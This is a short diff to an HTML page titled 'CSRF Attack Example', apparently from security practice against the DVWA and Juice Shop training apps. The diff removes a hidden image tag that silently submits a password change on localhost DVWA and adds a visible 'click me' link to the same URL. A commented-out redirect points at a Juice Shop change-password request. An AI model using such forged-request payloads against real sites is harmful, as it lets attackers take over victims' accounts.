@@ -6,8 +6,9 @@
     <title>CSRF Attack Example</title>
 </head>
 <body>
-    <img src="http://localhost/DVWA/vulnerabilities/csrf/?password_new=ranem&password_conf=ranem&Change=Change##" alt="CSRF Attack" style="display:none;">
-    <script>
+    <h1>Click here </h1>
+    <a href="http://localhost/DVWA/vulnerabilities/csrf/?password_new=ranem&password_conf=ranem&Change=Change#">click me</a>   
+        <script>
         // Alternatively, you can redirect the user to the malicious URL
         // window.location.href = "https://juice-shop.herokuapp.com/rest/user/change-password?current=123456&new=qwert&repeat=qwert";
     </script>
